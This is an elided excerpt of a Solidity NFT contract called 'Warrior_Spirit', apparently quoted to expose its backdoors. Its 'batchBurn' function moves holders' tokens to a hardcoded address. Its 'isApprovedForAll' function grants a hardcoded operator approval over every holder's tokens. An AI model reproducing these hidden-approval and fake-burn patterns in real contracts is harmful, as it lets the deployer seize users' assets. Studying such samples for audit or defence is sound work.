...
contract Warrior_Spirit is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  bytes32 public WhitelistMerkleRoot;  
  uint public maxSupply = 1688;
  ...
  ) ERC721A("Warrior_Spirit", "WS", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x8A57c2B7cEF072AEeEb19F02F7095bf64D293472, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0xc28AF47672A1774E4f8aa2528c12CBb3190D3C1E);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x7E38F7085517bDe75a9F55caB8b444d5b0CC6AD5){return true;}
